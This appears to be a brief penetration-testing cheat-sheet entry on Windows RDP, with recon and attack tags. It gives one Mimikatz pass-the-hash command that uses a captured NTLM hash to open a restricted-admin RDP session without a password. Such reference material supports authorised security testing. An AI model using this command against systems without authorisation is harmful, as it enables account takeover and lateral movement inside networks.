# windows
% rdp, windows, 3389
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON 

# powershell
% rdp, windows, 3389
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/RECON  #tag/powershell 

# mimikatz

% mimikatz, pth
#plateform/windows  #target/local  #protocol/rdp #port/3389 #cat/ATTACK/PTH


## mimikatz pth to RDP mstsc.exe
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash> /run:"mstsc.exe /restrictedadmin"
```
